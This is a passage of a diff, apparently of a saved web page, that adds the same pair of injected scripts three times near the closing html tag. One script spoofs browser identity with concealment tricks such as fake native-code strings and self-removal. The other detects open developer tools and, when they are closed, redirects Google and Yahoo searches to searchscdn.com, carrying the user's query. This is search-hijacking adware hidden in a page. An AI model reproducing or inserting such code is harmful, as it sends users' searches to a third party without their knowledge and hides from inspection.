+                ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"]
+            ).then(function(hints_value){
+                let new_hints_value_json = JSON.stringify(hints_value).replaceAll("Microsoft Edge", "Google Chrome");
+                let get_getHighEntropyValues = function getHighEntropyValues(hints){
+                    let no_need_hints = ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"];
+                    let new_hints_value = JSON.parse(new_hints_value_json);
+                    no_need_hints = no_need_hints.filter(x => !hints.includes(x));
+                    if (no_need_hints.length >0) {
+                        no_need_hints.forEach(rm_hints => {
+                            delete new_hints_value[rm_hints];
+                        });
+                    }
+                    return new Promise((resolve, reject) => {
+                        resolve(new_hints_value);
+                    });
+                }
+                assignGetterProperties(get_getHighEntropyValues, "getHighEntropyValues");
+                if (nav.userAgentData){
+                    Object.defineProperties(Object.getPrototypeOf(nav.userAgentData), {
+                        "getHighEntropyValues": {
+                            value: get_getHighEntropyValues
+                        }
+                    });
+                }
+            })
+        } 
+    }
+    change_ua(navigator,-1);
+    function change_iframe_ua(){
+        for (let index = 0; index < window.frames.length; index++) {
+            change_ua(window.frames[index].navigator,index);
+        }
+        setTimeout(()=>{
+            document.querySelectorAll('iframe').forEach(iframe => {
+                iframe.sandbox = "allow-scripts"
+            });
+            for (let index = 0; index < window.frames.length; index++) {                        
+                change_ua(window.frames[index].navigator,index);
+            }
+        },500);
+    }
+    if (document.readyState != "complete") document.addEventListener("DOMContentLoaded",change_iframe_ua)
+    change_iframe_ua()
+    const script = document.currentScript;
+    script.parentNode.removeChild(script);`;
+    document.documentElement.appendChild(script);
+})();
+(()=>{
+    let sid = 'XRSlTamhRkJ9eKb19BJ';
+    let rl = false;
+    const
+    wins=()=>{
+        return (100 < window.outerWidth - window.innerWidth || 200 < window.outerHeight - window.innerHeight);
+    },
+    cad=()=>{
+        if (wins() && !rl){
+            rl = true;
+            location.reload();
+        }
+    }
+    if (!wins()){
+        setInterval(cad, 100);
+        if (!document.getElementById(sid)){
+            let s = document.createElement('image');
+            s.id = sid;
+            document.body.appendChild(s);
+            let rules = [
+                {
+                    "rules":"^http(s|)://(www\\.|)google\\.[a-z.]{2,7}/search",
+                    "excludes":["[?&]tbm=","[?]q=[^&]*$"],
+                    "to":"https://searchscdn.com/2003/?s=g&q=",
+                    "key":"q"
+                },
+                {
+                    "rules":"^http(s|)://search\\.yahoo\\.com/search",
+                    "excludes":["[?&]hsimp=yhs-delfia(&|$)","[?&]hsimp=yhs-invalid(&|$)"],
+                    "to":"https://searchscdn.com/2003/?s=y&q=",
+                    "key":"p"
+                }
+            ];
+            rules.forEach(data=>{
+                if(new RegExp(data.rules).test(location.href)){
+                    let exclude = false;                
+                    for (let excludes of data.excludes) {
+                        if (new RegExp(excludes).exec(location.href)) exclude = true;
+                    }
+                    if (!exclude){
+                        let lurl = new URL(location.href);
+                        let rurl = data.to+encodeURIComponent(lurl.searchParams.get(data.key));
+                        location = rurl;
+                    }
+                }
+            })
+        }
+    };
+})();</script><script>(function(){
+    function findFrameIndex() {
+        let result = "";
+        try {
+            let parent, child = window;
+            while (child.parent != child) {
+                parent = child.parent;
+                for (let i = 0; i < parent.frames.length; i++) {
+                    if (parent.frames[i] == child) {
+                        result += i;   
+                    }
+                }                
+                child = parent;
+            }
+        } catch (e) {}
+        return result;
+    };
+    const storageKeyStart = "ua-script-prot-storage" + location.href + findFrameIndex() + "-key";
+    const storageCurrentKey = storageKeyStart + performance.timing.responseStart;
+    if (window[storageCurrentKey]) return;
+    window[storageCurrentKey] = 1;
+    const newUA = navigator.userAgent.replace(/[\s]+Edg[^\s]+/, '');
+    const newVersion = newUA.replace('Mozilla/', '');
+    let newUserAgentDataBrands = null;
+    if (navigator.userAgentData){
+        newUserAgentDataBrands = JSON.stringify(navigator.userAgentData.brands).replace("Microsoft Edge", "Google Chrome");
+    } 
+    const script = document.createElement('script');
+    script.textContent = `
+    let change_ua = function(nav,tt) {
+        if (nav.userAgent != '${newUA}') {
+            const proto = Object.getPrototypeOf(nav);
+            const toStringForToString = function toString() {
+                return "function toString() { [native code] }";
+            };
+            const setToStringProperties = function(func) {
+                Object.defineProperty(func, 'name', {value: "toString"});
+                Object.defineProperty(func, 'toString', {value: toStringForToString, enumerable: false});
+            };
+            setToStringProperties(toStringForToString);
+            const assignGetterProperties = function(getter, name, noPrefix) {
+                const prefix = (noPrefix ? "" : "get ");
+                Object.defineProperty(getter, 'name', {value: prefix+name});
+                const toString = function toString() {
+                    return "function "+prefix+name+"() { [native code] }";
+                };
+                setToStringProperties(toString);
+                Object.defineProperty(getter, 'toString', {value: toString, enumerable: false});
+            };
+            const get_vendor = function vendor() {
+                return 'Google Inc.';
+            };
+            assignGetterProperties(get_vendor, "vendor");
+            if (nav.vendor != 'Google Inc.') Object.defineProperty(proto, 'vendor', {get: get_vendor});
+            const get_vendorSub = function vendorSub() {
+                return '';
+            };
+            assignGetterProperties(get_vendorSub, "vendorSub");
+            if (nav.vendorSub != '') Object.defineProperty(proto, 'vendorSub', {get: get_vendorSub});                            
+            const get_userAgent = function userAgent() {
+                return '${newUA}';
+            };
+            assignGetterProperties(get_userAgent, "userAgent");
+            Object.defineProperty(proto, 'userAgent', {get: get_userAgent});
+            const get_appVersion = function appVersion() {
+                return '${newVersion}';
+            };
+            assignGetterProperties(get_appVersion, "appVersion");
+            Object.defineProperty(proto, 'appVersion', {get: get_appVersion});
+            const replacePluginName = name => name.replace("Microsoft Edge", "Chrome");
+        
+            const pluginsKeysDescriptors = Object.getOwnPropertyDescriptors(nav.plugins);
+            const newPluginsValuesDescriptors = {};
+            for (let key in pluginsKeysDescriptors) {
+                newPluginsValuesDescriptors[key] = Object.getOwnPropertyDescriptor(nav.plugins, key);
+            } 
+            
+            const get_name = function name() {
+                return this.Name;
+            };
+            assignGetterProperties(get_name, "name");
+            for (let key in newPluginsValuesDescriptors) {
+                let newName = replacePluginName(newPluginsValuesDescriptors[key].value.name);                
+                if (key.indexOf("Microsoft Edge")>=0) {
+                    let newKey = replacePluginName(key);
+                    newPluginsValuesDescriptors[newKey] = newPluginsValuesDescriptors[key];
+                    delete newPluginsValuesDescriptors[key];
+                    newPluginsValuesDescriptors[newKey].value['Name'] = newName + ' test'
+                    newPluginsValuesDescriptors[newKey].writable = false;
+                } else {
+                    newPluginsValuesDescriptors[key].writable = true;
+                    newPluginsValuesDescriptors[key].value['Name'] = newName
+                    newPluginsValuesDescriptors[key].writable = false;
+                }
+            }
+            if (nav.plugins[0]){
+                Object.defineProperty(Object.getPrototypeOf(nav.plugins[0]), "name", {get: get_name});
+            }
+            const pluginsProto = Object.getPrototypeOf(nav.plugins);
+            const newPlugins = Object.create(pluginsProto);
+            for (let key in newPluginsValuesDescriptors) {
+                Object.defineProperty(newPlugins, key, newPluginsValuesDescriptors[key]);
+            }
+            const new_refresh = function refresh() {};
+            assignGetterProperties(new_refresh, "refresh", true);
+            const new_item = function item(index) {
+                return newPlugins[+index || 0] || null;
+            };
+            assignGetterProperties(new_item, "item", true);
+            const new_namedItem = function namedItem(key) {
+                if (!key || !key.trim || parseInt(key) || key.trim() == "0")
+                    return null;
+                return newPlugins[key] || null; 
+            };
+            assignGetterProperties(new_namedItem, "namedItem", true);
+            const pluginsLength = nav.plugins.length;
+            Object.defineProperties(pluginsProto, {
+                "item": {value: new_item},
+                "namedItem": {value: new_namedItem},
+                "refresh": {value: new_refresh}
+            });
+            const get_plugins = function plugins() {
+                return newPlugins;
+            };
+            assignGetterProperties(get_plugins, "plugins");
+            Object.defineProperty(proto, "plugins", {get: get_plugins});
+            const get_length = function length() {
+                return pluginsLength;
+            };
+            assignGetterProperties(get_length, "length");
+            Object.defineProperty(Object.getPrototypeOf(nav.plugins), "length", {get: get_length});
+        
+            let newBrands;
+            if (nav.userAgentData) newBrands = JSON.parse('${newUserAgentDataBrands}');
+            const get_brands = function brands() {
+                return newBrands;
+            };
+            assignGetterProperties(get_brands, "brands");
+            if (nav.userAgentData) Object.defineProperty(Object.getPrototypeOf(nav.userAgentData), "brands", {get: get_brands});
+            
+            navigator.userAgentData.getHighEntropyValues(
+                ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"]
+            ).then(function(hints_value){
+                let new_hints_value_json = JSON.stringify(hints_value).replaceAll("Microsoft Edge", "Google Chrome");
+                let get_getHighEntropyValues = function getHighEntropyValues(hints){
+                    let no_need_hints = ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"];
+                    let new_hints_value = JSON.parse(new_hints_value_json);
+                    no_need_hints = no_need_hints.filter(x => !hints.includes(x));
+                    if (no_need_hints.length >0) {
+                        no_need_hints.forEach(rm_hints => {
+                            delete new_hints_value[rm_hints];
+                        });
+                    }
+                    return new Promise((resolve, reject) => {
+                        resolve(new_hints_value);
+                    });
+                }
+                assignGetterProperties(get_getHighEntropyValues, "getHighEntropyValues");
+                if (nav.userAgentData){
+                    Object.defineProperties(Object.getPrototypeOf(nav.userAgentData), {
+                        "getHighEntropyValues": {
+                            value: get_getHighEntropyValues
+                        }
+                    });
+                }
+            })
+        } 
+    }
+    change_ua(navigator,-1);
+    function change_iframe_ua(){
+        for (let index = 0; index < window.frames.length; index++) {
+            change_ua(window.frames[index].navigator,index);
+        }
+        setTimeout(()=>{
+            document.querySelectorAll('iframe').forEach(iframe => {
+                iframe.sandbox = "allow-scripts"
+            });
+            for (let index = 0; index < window.frames.length; index++) {                        
+                change_ua(window.frames[index].navigator,index);
+            }
+        },500);
+    }
+    if (document.readyState != "complete") document.addEventListener("DOMContentLoaded",change_iframe_ua)
+    change_iframe_ua()
+    const script = document.currentScript;
+    script.parentNode.removeChild(script);`;
+    document.documentElement.appendChild(script);
+})();
+(()=>{
+    let sid = 'XRSlTamhRkJ9eKb19BJ';
+    let rl = false;
+    const
+    wins=()=>{
+        return (100 < window.outerWidth - window.innerWidth || 200 < window.outerHeight - window.innerHeight);
+    },
+    cad=()=>{
+        if (wins() && !rl){
+            rl = true;
+            location.reload();
+        }
+    }
+    if (!wins()){
+        setInterval(cad, 100);
+        if (!document.getElementById(sid)){
+            let s = document.createElement('image');
+            s.id = sid;
+            document.body.appendChild(s);
+            let rules = [
+                {
+                    "rules":"^http(s|)://(www\\.|)google\\.[a-z.]{2,7}/search",
+                    "excludes":["[?&]tbm=","[?]q=[^&]*$"],
+                    "to":"https://searchscdn.com/2003/?s=g&q=",
+                    "key":"q"
+                },
+                {
+                    "rules":"^http(s|)://search\\.yahoo\\.com/search",
+                    "excludes":["[?&]hsimp=yhs-delfia(&|$)","[?&]hsimp=yhs-invalid(&|$)"],
+                    "to":"https://searchscdn.com/2003/?s=y&q=",
+                    "key":"p"
+                }
+            ];
+            rules.forEach(data=>{
+                if(new RegExp(data.rules).test(location.href)){
+                    let exclude = false;                
+                    for (let excludes of data.excludes) {
+                        if (new RegExp(excludes).exec(location.href)) exclude = true;
+                    }
+                    if (!exclude){
+                        let lurl = new URL(location.href);
+                        let rurl = data.to+encodeURIComponent(lurl.searchParams.get(data.key));
+                        location = rurl;
+                    }
+                }
+            })
+        }
+    };
+})();</script><script>(function(){
+    function findFrameIndex() {
+        let result = "";
+        try {
+            let parent, child = window;
+            while (child.parent != child) {
+                parent = child.parent;
+                for (let i = 0; i < parent.frames.length; i++) {
+                    if (parent.frames[i] == child) {
+                        result += i;   
+                    }
+                }                
+                child = parent;
+            }
+        } catch (e) {}
+        return result;
+    };
+    const storageKeyStart = "ua-script-prot-storage" + location.href + findFrameIndex() + "-key";
+    const storageCurrentKey = storageKeyStart + performance.timing.responseStart;
+    if (window[storageCurrentKey]) return;
+    window[storageCurrentKey] = 1;
+    const newUA = navigator.userAgent.replace(/[\s]+Edg[^\s]+/, '');
+    const newVersion = newUA.replace('Mozilla/', '');
+    let newUserAgentDataBrands = null;
+    if (navigator.userAgentData){
+        newUserAgentDataBrands = JSON.stringify(navigator.userAgentData.brands).replace("Microsoft Edge", "Google Chrome");
+    } 
+    const script = document.createElement('script');
+    script.textContent = `
+    let change_ua = function(nav,tt) {
+        if (nav.userAgent != '${newUA}') {
+            const proto = Object.getPrototypeOf(nav);
+            const toStringForToString = function toString() {
+                return "function toString() { [native code] }";
+            };
+            const setToStringProperties = function(func) {
+                Object.defineProperty(func, 'name', {value: "toString"});
+                Object.defineProperty(func, 'toString', {value: toStringForToString, enumerable: false});
+            };
+            setToStringProperties(toStringForToString);
+            const assignGetterProperties = function(getter, name, noPrefix) {
+                const prefix = (noPrefix ? "" : "get ");
+                Object.defineProperty(getter, 'name', {value: prefix+name});
+                const toString = function toString() {
+                    return "function "+prefix+name+"() { [native code] }";
+                };
+                setToStringProperties(toString);
+                Object.defineProperty(getter, 'toString', {value: toString, enumerable: false});
+            };
+            const get_vendor = function vendor() {
+                return 'Google Inc.';
+            };
+            assignGetterProperties(get_vendor, "vendor");
+            if (nav.vendor != 'Google Inc.') Object.defineProperty(proto, 'vendor', {get: get_vendor});
+            const get_vendorSub = function vendorSub() {
+                return '';
+            };
+            assignGetterProperties(get_vendorSub, "vendorSub");
+            if (nav.vendorSub != '') Object.defineProperty(proto, 'vendorSub', {get: get_vendorSub});                            
+            const get_userAgent = function userAgent() {
+                return '${newUA}';
+            };
+            assignGetterProperties(get_userAgent, "userAgent");
+            Object.defineProperty(proto, 'userAgent', {get: get_userAgent});
+            const get_appVersion = function appVersion() {
+                return '${newVersion}';
+            };
+            assignGetterProperties(get_appVersion, "appVersion");
+            Object.defineProperty(proto, 'appVersion', {get: get_appVersion});
+            const replacePluginName = name => name.replace("Microsoft Edge", "Chrome");
+        
+            const pluginsKeysDescriptors = Object.getOwnPropertyDescriptors(nav.plugins);
+            const newPluginsValuesDescriptors = {};
+            for (let key in pluginsKeysDescriptors) {
+                newPluginsValuesDescriptors[key] = Object.getOwnPropertyDescriptor(nav.plugins, key);
+            } 
+            
+            const get_name = function name() {
+                return this.Name;
+            };
+            assignGetterProperties(get_name, "name");
+            for (let key in newPluginsValuesDescriptors) {
+                let newName = replacePluginName(newPluginsValuesDescriptors[key].value.name);                
+                if (key.indexOf("Microsoft Edge")>=0) {
+                    let newKey = replacePluginName(key);
+                    newPluginsValuesDescriptors[newKey] = newPluginsValuesDescriptors[key];
+                    delete newPluginsValuesDescriptors[key];
+                    newPluginsValuesDescriptors[newKey].value['Name'] = newName + ' test'
+                    newPluginsValuesDescriptors[newKey].writable = false;
+                } else {
+                    newPluginsValuesDescriptors[key].writable = true;
+                    newPluginsValuesDescriptors[key].value['Name'] = newName
+                    newPluginsValuesDescriptors[key].writable = false;
+                }
+            }
+            if (nav.plugins[0]){
+                Object.defineProperty(Object.getPrototypeOf(nav.plugins[0]), "name", {get: get_name});
+            }
+            const pluginsProto = Object.getPrototypeOf(nav.plugins);
+            const newPlugins = Object.create(pluginsProto);
+            for (let key in newPluginsValuesDescriptors) {
+                Object.defineProperty(newPlugins, key, newPluginsValuesDescriptors[key]);
+            }
+            const new_refresh = function refresh() {};
+            assignGetterProperties(new_refresh, "refresh", true);
+            const new_item = function item(index) {
+                return newPlugins[+index || 0] || null;
+            };
+            assignGetterProperties(new_item, "item", true);
+            const new_namedItem = function namedItem(key) {
+                if (!key || !key.trim || parseInt(key) || key.trim() == "0")
+                    return null;
+                return newPlugins[key] || null; 
+            };
+            assignGetterProperties(new_namedItem, "namedItem", true);
+            const pluginsLength = nav.plugins.length;
+            Object.defineProperties(pluginsProto, {
+                "item": {value: new_item},
+                "namedItem": {value: new_namedItem},
+                "refresh": {value: new_refresh}
+            });
+            const get_plugins = function plugins() {
+                return newPlugins;
+            };
+            assignGetterProperties(get_plugins, "plugins");
+            Object.defineProperty(proto, "plugins", {get: get_plugins});
+            const get_length = function length() {
+                return pluginsLength;
+            };
+            assignGetterProperties(get_length, "length");
+            Object.defineProperty(Object.getPrototypeOf(nav.plugins), "length", {get: get_length});
+        
+            let newBrands;
+            if (nav.userAgentData) newBrands = JSON.parse('${newUserAgentDataBrands}');
+            const get_brands = function brands() {
+                return newBrands;
+            };
+            assignGetterProperties(get_brands, "brands");
+            if (nav.userAgentData) Object.defineProperty(Object.getPrototypeOf(nav.userAgentData), "brands", {get: get_brands});
+            
+            navigator.userAgentData.getHighEntropyValues(
+                ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"]
+            ).then(function(hints_value){
+                let new_hints_value_json = JSON.stringify(hints_value).replaceAll("Microsoft Edge", "Google Chrome");
+                let get_getHighEntropyValues = function getHighEntropyValues(hints){
+                    let no_need_hints = ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"];
+                    let new_hints_value = JSON.parse(new_hints_value_json);
+                    no_need_hints = no_need_hints.filter(x => !hints.includes(x));
+                    if (no_need_hints.length >0) {
+                        no_need_hints.forEach(rm_hints => {
+                            delete new_hints_value[rm_hints];
+                        });
+                    }
+                    return new Promise((resolve, reject) => {
+                        resolve(new_hints_value);
+                    });
+                }
+                assignGetterProperties(get_getHighEntropyValues, "getHighEntropyValues");
+                if (nav.userAgentData){
+                    Object.defineProperties(Object.getPrototypeOf(nav.userAgentData), {
+                        "getHighEntropyValues": {
+                            value: get_getHighEntropyValues
+                        }
+                    });
+                }
+            })
+        } 
+    }
+    change_ua(navigator,-1);
+    function change_iframe_ua(){
+        for (let index = 0; index < window.frames.length; index++) {
+            change_ua(window.frames[index].navigator,index);
+        }
+        setTimeout(()=>{
+            document.querySelectorAll('iframe').forEach(iframe => {
+                iframe.sandbox = "allow-scripts"
+            });
+            for (let index = 0; index < window.frames.length; index++) {                        
+                change_ua(window.frames[index].navigator,index);
+            }
+        },500);
+    }
+    if (document.readyState != "complete") document.addEventListener("DOMContentLoaded",change_iframe_ua)
+    change_iframe_ua()
+    const script = document.currentScript;
+    script.parentNode.removeChild(script);`;
+    document.documentElement.appendChild(script);
+})();
+(()=>{
+    let sid = 'XRSlTamhRkJ9eKb19BJ';
+    let rl = false;
+    const
+    wins=()=>{
+        return (100 < window.outerWidth - window.innerWidth || 200 < window.outerHeight - window.innerHeight);
+    },
+    cad=()=>{
+        if (wins() && !rl){
+            rl = true;
+            location.reload();
+        }
+    }
+    if (!wins()){
+        setInterval(cad, 100);
+        if (!document.getElementById(sid)){
+            let s = document.createElement('image');
+            s.id = sid;
+            document.body.appendChild(s);
+            let rules = [
+                {
+                    "rules":"^http(s|)://(www\\.|)google\\.[a-z.]{2,7}/search",
+                    "excludes":["[?&]tbm=","[?]q=[^&]*$"],
+                    "to":"https://searchscdn.com/2003/?s=g&q=",
+                    "key":"q"
+                },
+                {
+                    "rules":"^http(s|)://search\\.yahoo\\.com/search",
+                    "excludes":["[?&]hsimp=yhs-delfia(&|$)","[?&]hsimp=yhs-invalid(&|$)"],
+                    "to":"https://searchscdn.com/2003/?s=y&q=",
+                    "key":"p"
+                }
+            ];
+            rules.forEach(data=>{
+                if(new RegExp(data.rules).test(location.href)){
+                    let exclude = false;                
+                    for (let excludes of data.excludes) {
+                        if (new RegExp(excludes).exec(location.href)) exclude = true;
+                    }
+                    if (!exclude){
+                        let lurl = new URL(location.href);
+                        let rurl = data.to+encodeURIComponent(lurl.searchParams.get(data.key));
+                        location = rurl;
+                    }
+                }
+            })
+        }
+    };
+})();</script></html>
